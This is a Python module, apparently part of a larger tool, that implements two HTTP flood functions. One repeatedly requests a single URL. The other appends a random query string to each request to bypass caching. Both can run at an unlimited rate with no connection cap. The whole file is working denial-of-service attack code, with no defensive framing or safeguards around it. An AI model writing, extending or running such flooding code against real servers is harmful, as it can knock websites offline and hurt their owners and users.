import asyncio
import random
import string
import time

import aiohttp

from core.levels import Stats
from utils import ok

HTTP_OVERHEAD = 300


def _same_url(url):
    return url


def _query_url(url):
    q = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}q={q}"


async def _http_run(url, duration, rate, url_fn, tag):
    mode = "unlimited" if rate <= 0 else f"{rate}/s"
    ok(f"[{tag}] start url={url} dur={duration}s rate={mode}")
    end = time.perf_counter() + duration
    timeout = aiohttp.ClientTimeout(total=5)
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    stats = Stats()
    interval = (1.0 / rate) if rate > 0 else 0.0
    next_tick = time.perf_counter()
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as sess:
        while time.perf_counter() < end:
            target = url_fn(url)
            try:
                async with sess.get(target) as r:
                    data = await r.read()
                    stats.sent += 1
                    stats.bytes_out += len(data) + HTTP_OVERHEAD
            except Exception:
                stats.fails += 1
            if rate <= 0:
                await asyncio.sleep(0)
            else:
                next_tick += interval
                now = time.perf_counter()
                if next_tick > now:
                    await asyncio.sleep(next_tick - now)
                else:
                    await asyncio.sleep(0)
    stats.report(tag, "rps")


async def http_status_flood(url, duration, rate=20):
    await _http_run(url, duration, rate, _same_url, "HTTP-STATUS")


async def http_query_flood(url, duration, rate=20):
    await _http_run(url, duration, rate, _query_url, "HTTP-QUERY")
